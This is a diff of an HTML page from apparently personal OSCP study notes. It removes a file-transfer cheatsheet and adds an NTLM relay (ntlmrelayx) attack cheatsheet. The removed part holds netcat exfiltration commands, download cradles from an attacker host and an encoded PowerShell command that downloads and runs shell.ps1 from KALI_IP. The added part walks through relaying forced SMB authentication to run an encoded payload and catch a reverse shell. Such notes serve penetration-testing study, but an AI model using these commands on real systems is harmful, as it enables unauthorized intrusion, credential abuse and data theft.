@@ -3,12 +3,13 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>File Transfer - OSCP Notes</title>
+    <title>Web Fuzzing - AD Notes</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
+    <!-- NAVBAR -->
     <nav>
         <a href="index.html">Home</a>
 
@@ -107,226 +108,229 @@
         <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
         <div id="search-results" class="search-results collapsed"></div>
     </div>
+    <!-- CONTENT -->
+
     <div class="container">
 
-        <h1>File Transfer Cheatsheet (Kali ↔ Windows / Linux)</h1>
+    <h1>NTLM Relay Attack (ntlmrelayx) Cheatsheet</h1>
+
+    <!-- 1 -->
+    <div class="section">
+        <div class="section-header">1. Concept Overview</div>
+        <div class="section-content">
+
+            <p>
+                NTLM Relay attacks forward captured NTLM authentication attempts to another target instead of cracking them.
+            </p>
+
+            <p><strong>Goal:</strong></p>
+            <ul>
+                <li>Intercept authentication</li>
+                <li>Relay it to a different machine</li>
+                <li>Gain access or execute commands</li>
+            </ul>
 
-        <div class="section">
-            <div class="section-header">1. Kali → Windows (HTTP Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>certutil -urlcache -split -f http://KALI_IP/file.exe file.exe</code></pre>
-
-                <pre><code>iwr http://KALI_IP/file.exe -OutFile file.exe</code></pre>
-
-                <pre><code>powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','file.exe')"</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">2. Kali → Windows (SMB Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>impacket-smbserver share . -smb2support -username kali -password kali</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>net use \\KALI_IP\share /user:kali kali
-copy file.exe \\KALI_IP\share\</code></pre>
-
-                Or download from share:
-
-                <pre><code>copy \\KALI_IP\share\file.exe file.exe</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">3. Windows → Kali (Netcat Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>nc -lvnp 9001 > file.exe</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.exe</code></pre>
-
-                If no nc on Windows:
-
-                <pre><code>type file.exe | nc KALI_IP 9001</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">4. Kali → Linux (HTTP Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80</code></pre>
-
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>wget http://KALI_IP/file.sh
-curl http://KALI_IP/file.sh -o file.sh</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">5. Linux → Kali (Netcat Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>nc -lvnp 9001 > file.txt</code></pre>
-
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.txt</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">6. SCP (If SSH Available)</div>
-            <div class="section-content">
-
-                <p><strong>From Kali to Linux:</strong></p>
-
-                <pre><code>scp file user@TARGET_IP:/tmp/</code></pre>
-
-                <p><strong>From Linux to Kali:</strong></p>
-
-                <pre><code>scp user@TARGET_IP:/tmp/file .</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">7. Base64 Transfer (When Nothing Works)</div>
-            <div class="section-content">
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>base64 file.exe</code></pre>
-
-                Copy output manually.
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">8. PowerShell Encoded Download</div>
-            <div class="section-content">
-
-                <pre><code>powershell -enc BASE64COMMAND</code></pre>
-
-                Generate encoded command:
-
-                <pre><code>echo -n "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">9. FTP Quick Method</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>sudo python3 -m pyftpdlib -p 21</code></pre>
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>ftp KALI_IP</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">10. OSCP Mental Quick Picks</div>
-            <div class="section-content">
-
-                <ul>
-                    <li>Have PowerShell? → iwr</li>
-                    <li>No PowerShell? → certutil</li>
-                    <li>Linux? → wget</li>
-                    <li>No tools? → base64</li>
-                    <li>Need exfiltration? → netcat</li>
-                    <li>SMB open? → impacket-smbserver</li>
-                </ul>
-
-            </div>
-        </div>
-        <div class="section">
-            <div class="section-header">11. Transfer Through Pivot (Ligolo / Tunnel)</div>
-            <div class="section-content">
-
-                <p>Cuando estás dentro de una red interna, NO puedes usar directamente tu IP de Kali.</p>
-
-                <p><strong>Solución:</strong> usar el túnel (ej: Ligolo)</p>
-
-                <p><strong>Ejemplo:</strong> descargar desde Kali a máquina interna</p>
-
-                <pre><code>wget http://ATTACKER_TUN_IP/file.sh
-</code></pre>
-
-                <p>Tu IP será algo como:</p>
-
-                <pre><code>10.10.0.1 (interfaz ligolo)</code></pre>
-
-                <p><strong>Servidor en Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80 --bind 0.0.0.0
-</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">12. Transfer Without Tools (Echo / Chunking)</div>
-            <div class="section-content">
-
-                <p>Cuando NO hay wget, curl, nc...</p>
-
-                <p><strong>En Kali:</strong></p>
-
-                <pre><code>base64 file.exe > file.b64
-</code></pre>
-
-                <p><strong>En víctima:</strong></p>
-
-                <pre><code>echo BASE64_PART >> file.b64
-</code></pre>
-
-                <p>Repetir por partes.</p>
-
-                <p><strong>Decodificar:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe
-</code></pre>
-
-            </div>
         </div>
     </div>
 
+    <!-- 2 -->
+    <div class="section">
+        <div class="section-header">2. Requirements</div>
+        <div class="section-content">
+
+            <ul>
+                <li>SMB authentication attempt from victim</li>
+                <li>Relay target vulnerable to NTLM authentication</li>
+                <li>User with sufficient privileges on target</li>
+            </ul>
+
+            <p><strong>Limitations:</strong></p>
+            <ul>
+                <li>UAC Remote Restrictions may block non-Administrator accounts</li>
+                <li>Works best with reused local admin credentials</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 3 -->
+    <div class="section">
+        <div class="section-header">3. Start ntlmrelayx</div>
+        <div class="section-content">
+
+            <pre><code>impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP -c "COMMAND"
+</code></pre>
+
+            <p><strong>Example:</strong></p>
+
+            <pre><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc BASE64_PAYLOAD"
+</code></pre>
+
+            <p><strong>Flags explanation:</strong></p>
+            <ul>
+                <li>--no-http-server → disable HTTP relay</li>
+                <li>-smb2support → enable SMB2 protocol</li>
+                <li>-t → target machine</li>
+                <li>-c → command to execute on target</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 4 -->
+    <div class="section">
+        <div class="section-header">4. Prepare Reverse Shell Listener</div>
+        <div class="section-content">
+
+            <pre><code>nc -nvlp PORT
+</code></pre>
+
+            <p><strong>Example:</strong></p>
+
+            <pre><code>nc -nvlp 8080
+</code></pre>
+
+            <p><strong>Purpose:</strong></p>
+            <ul>
+                <li>Catch reverse shell from relay execution</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 5 -->
+    <div class="section">
+        <div class="section-header">5. Trigger SMB Authentication</div>
+        <div class="section-content">
+
+            <p>From the victim machine, force an SMB connection to attacker:</p>
+
+            <pre><code>dir \\ATTACKER_IP\share
+</code></pre>
+
+            <p><strong>Example:</strong></p>
+
+            <pre><code>dir \\192.168.119.2\test
+</code></pre>
+
+            <p><strong>What happens:</strong></p>
+            <ul>
+                <li>Victim authenticates via NTLM</li>
+                <li>ntlmrelayx captures and relays authentication</li>
+                <li>Authentication is forwarded to target</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 6 -->
+    <div class="section">
+        <div class="section-header">6. Relay Execution</div>
+        <div class="section-content">
+
+            <p>Once relay is successful, ntlmrelayx will:</p>
+
+            <ul>
+                <li>Authenticate as the relayed user</li>
+                <li>Execute the specified command on the target</li>
+                <li>Trigger reverse shell (if payload used)</li>
+            </ul>
+
+            <p><strong>Example output:</strong></p>
+
+            <pre><code>Authenticating against TARGET as DOMAIN\USER SUCCESS
+Executed specified command on host
+</code></pre>
+
+        </div>
+    </div>
+
+    <!-- 7 -->
+    <div class="section">
+        <div class="section-header">7. Reverse Shell Execution</div>
+        <div class="section-content">
+
+            <p>If using a PowerShell reverse shell payload:</p>
+
+            <pre><code>powershell -enc BASE64_PAYLOAD
+</code></pre>
+
+            <p><strong>Result:</strong></p>
+            <ul>
+                <li>Target executes payload</li>
+                <li>Reverse connection established to attacker</li>
+                <li>Shell obtained (often SYSTEM)</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 8 -->
+    <div class="section">
+        <div class="section-header">8. What to Look For</div>
+        <div class="section-content">
+
+            <ul>
+                <li>Relayed authentication success</li>
+                <li>User privileges on target</li>
+                <li>Command execution confirmation</li>
+                <li>Incoming reverse shell connection</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 9 -->
+    <div class="section">
+        <div class="section-header">9. Common Pitfalls</div>
+        <div class="section-content">
+
+            <ul>
+                <li>SMB signing enabled on target (blocks relay)</li>
+                <li>UAC remote restrictions blocking non-admin users</li>
+                <li>No authentication attempts reaching attacker</li>
+                <li>Firewall blocking SMB or payload traffic</li>
+                <li>Incorrect target configuration</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- FLOW -->
+    <div class="section">
+        <div class="section-header">Attack Flow</div>
+        <div class="section-content">
+
+            <ol>
+                <li>Start ntlmrelayx with target and command</li>
+                <li>Start listener (nc) for reverse shell</li>
+                <li>Trigger SMB authentication from victim</li>
+                <li>Capture and relay NTLM authentication</li>
+                <li>Execute command on target</li>
+                <li>Receive reverse shell</li>
+            </ol>
+
+        </div>
+    </div>
+
+    <!-- NOTES -->
+    <div class="section">
+        <div class="section-header">Key Notes</div>
+        <div class="section-content">
+
+            <ul>
+                <li>Relay attacks do not require cracking hashes</li>
+                <li>Effective when credentials are reused across machines</li>
+                <li>Common in internal network penetration tests</li>
+                <li>Works best in environments without SMB signing enforced</li>
+            </ul>
+
+        </div>
+    </div>
+
+</div>
+  
+    <!-- SCRIPT -->
     <script>
         document.querySelectorAll(".section-header").forEach(h => {
             h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
